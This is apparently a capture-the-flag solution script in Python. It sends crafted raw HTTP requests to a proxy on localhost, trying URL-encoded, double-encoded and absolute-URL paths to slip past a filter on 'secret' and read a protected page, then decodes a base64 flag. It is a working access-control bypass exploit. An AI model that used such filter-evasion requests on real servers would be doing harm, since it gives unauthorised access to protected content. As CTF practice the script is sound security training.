#!/usr/bin/env python3
import socket
import base64

def send_http_request(host, port, request):
    """Send raw HTTP request and get response"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        sock.send(request.encode('ascii'))
        
        response = b""
        while True:
            data = sock.recv(4096)
            if not data:
                break
            response += data
        
        sock.close()
        return response
    except Exception as e:
        print(f"Error: {e}")
        return None

def exploit_proxy():
    """Exploit the proxy to access secret.html"""
    
    # The key insight: the proxy doesn't URL decode, so we can use URL encoding
    # to bypass the "secret" filter
    
    # Test 1: URL encode the 'e' in 'secret'
    request1 = """GET /s%65cret.html HTTP/1.1\r
Host: localhost:8000\r
Connection: close\r
\r
"""
    
    # Test 2: URL encode multiple characters
    request2 = """GET /s%65%63ret.html HTTP/1.1\r
Host: localhost:8000\r
Connection: close\r
\r
"""
    
    # Test 3: URL encode the 's' in 'secret'
    request3 = """GET /%73ecret.html HTTP/1.1\r
Host: localhost:8000\r
Connection: close\r
\r
"""
    
    # Test 4: URL encode 's' and 'e'
    request4 = """GET /%73%65cret.html HTTP/1.1\r
Host: localhost:8000\r
Connection: close\r
\r
"""
    
    # Test 5: Double URL encoding
    request5 = """GET /s%2565cret.html HTTP/1.1\r
Host: localhost:8000\r
Connection: close\r
\r
"""
    
    # Test 6: Using absolute URL with URL encoding
    request6 = """GET http://localhost:8000/s%65cret.html HTTP/1.1\r
Host: localhost:8000\r
Connection: close\r
\r
"""
    
    test_cases = [
        ("URL encode 'e'", request1),
        ("URL encode 'e' and 'c'", request2),
        ("URL encode 's'", request3),
        ("URL encode 's' and 'e'", request4),
        ("Double URL encoding", request5),
        ("Absolute URL with encoding", request6),
    ]
    
    print("Testing proxy bypass techniques...")
    print("=" * 60)
    
    for test_name, request in test_cases:
        print(f"\nTest: {test_name}")
        print(f"Request: {request.split()[1]}")
        
        response = send_http_request("localhost", 8000, request)
        
        if response:
            # Parse response
            try:
                response_text = response.decode('utf-8', errors='ignore')
                status_line = response_text.split('\r\n')[0]
                print(f"Status: {status_line}")
                
                if "200 OK" in status_line:
                    print("SUCCESS! Got 200 OK response")
                    
                    # Look for flag in response
                    if "COMPFEST" in response_text or "flag" in response_text.lower():
                        print("FLAG FOUND!")
                        # Extract the base64 encoded flag
                        if "{{ FLAG }}" in response_text:
                            # The flag should be base64 encoded in the HTML
                            # Look for base64 pattern
                            import re
                            base64_pattern = r'[A-Za-z0-9+/]{20,}={0,2}'
                            matches = re.findall(base64_pattern, response_text)
                            for match in matches:
                                try:
                                    decoded = base64.b64decode(match).decode('utf-8')
                                    if "COMPFEST" in decoded:
                                        print(f"DECODED FLAG: {decoded}")
                                        return decoded
                                except:
                                    continue
                    
                    # Show first 500 chars of response
                    print(f"Response preview: {response_text[:500]}...")
                    
                elif "301" in status_line or "307" in status_line:
                    print("Request was redirected/rejected")
                else:
                    print(f"Unexpected response: {response_text[:200]}...")
                    
            except Exception as e:
                print(f"Error parsing response: {e}")
        else:
            print("No response received")
    
    return None

if __name__ == "__main__":
    flag = exploit_proxy()
    if flag:
        print(f"\nüéâ FLAG FOUND: {flag}")
    else:
        print("\n‚ùå No flag found with these techniques")
        print("Try running the application first with: docker-compose up --build")
